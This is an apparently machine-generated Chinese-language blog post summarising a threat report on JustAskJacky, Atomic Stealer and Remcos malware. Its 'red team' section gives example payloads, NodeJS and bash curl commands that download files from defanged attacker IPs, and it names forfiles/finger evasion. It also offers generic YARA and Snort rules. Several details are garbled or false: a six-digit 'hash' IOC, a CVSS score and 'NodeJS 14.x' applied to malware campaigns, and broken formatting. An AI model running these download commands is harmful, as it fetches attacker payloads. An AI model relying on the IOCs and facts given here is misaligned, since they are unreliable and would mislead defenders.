---
layout: post
title:  "Intelligence Insights: January 2026"
date:   2026-01-23 01:13:50 +0000
categories: [security]
severity: high
---

# 🔥 逆向工程分析：JustAskJacky、Atomic Stealer 與 Remcos 的技術細節
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: NodeJS, Memory Reconnaissance, Arbitrary Command Execution

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: JustAskJacky 利用 NodeJS 的動態特性，進行記憶體偵查和任意命令執行。Atomic Stealer 則是針對 macOS 系統，竊取瀏覽器和本地儲存的敏感資訊。
* **攻擊流程圖解**: 
    1. JustAskJacky: `User Input -> NodeJS Execution -> Memory Reconnaissance -> Arbitrary Command Execution`
    2. Atomic Stealer: `User Interaction -> macOS System Call -> Data Exfiltration`
* **受影響元件**: NodeJS 14.x, macOS High Sierra 或更新版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 網路存取權限、NodeJS 環境
* **Payload 建構邏輯**:

    ```
    
    javascript
    // JustAskJacky Payload 範例
    const childProcess = require('child_process');
    childProcess.exec('curl -s -L -o "payload.txt" 79.141.172[.]212/tcp');
    
    ```
 

```

bash
# Atomic Stealer Payload 範例
curl -s -L -o "payload.zip" 91.193.19[.]108
unzip payload.zip

```
* **繞過技術**: 使用 `forfiles` 命令和 Finger Protocol 進行間接執行，繞過防禦機制

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 458721 | 79.141.172[.]212 | - | C:\Users\username\AppData\Local\ |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule JustAskJacky_Detection {
        meta:
            description = "Detects JustAskJacky malware"
            author = "Your Name"
        strings:
            $a = "curl -s -L -o"
        condition:
            $a
    }
    
    ```
 

```

snort
alert tcp any any -> any any (msg:"JustAskJacky Detection"; content:"curl -s -L -o"; sid:1000001;)

```
* **緩解措施**: 更新 NodeJS 版本，限制網路存取權限，使用防毒軟體進行掃描

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **NodeJS**: 一種基於 Chrome V8 引擎的 JavaScript 執行環境，允許開發人員在伺服器端執行 JavaScript 代碼。
* **Memory Reconnaissance**: 記憶體偵查，指的是攻擊者嘗試獲取系統記憶體中的敏感資訊，例如密碼或加密金鑰。
* **Arbitrary Command Execution**: 任意命令執行，指的是攻擊者可以在系統上執行任意命令，可能導致系統被完全控制。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


